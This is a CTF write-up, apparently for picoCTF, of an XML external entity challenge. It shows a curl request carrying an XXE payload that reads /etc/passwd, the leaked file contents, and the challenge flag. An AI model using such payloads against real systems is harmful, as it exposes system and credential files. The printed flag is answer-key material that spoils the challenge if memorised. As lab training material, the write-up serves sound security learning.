## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

[Web Portal](http://saturn.picoctf.net:49436/)
1.- XML external entity Injection
## Solución
```
/static/js/xmlDetailsCheckPayload.js
window.contentType = 'application/xml';

Petición normal:

curl -s -X POST 'http://saturn.picoctf.net:49436/data' -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>'

Payload XXE para leer /etc/passwd:

curl -s -X POST 'http://saturn.picoctf.net:49436/data' -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>'

flask:x:999:999::/app:/bin/sh
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
Dark23-academy@webshell:~$ 


picoCTF{XML_3xtern@l_3nt1t1ty_4dbeb2ed}
```

## Notas Adicionales
- La bandera estaba dentro de `/etc/passwd`, en la línea del usuario `picoctf`.
## Referencias
[Web Portal](http://saturn.picoctf.net:49436/)
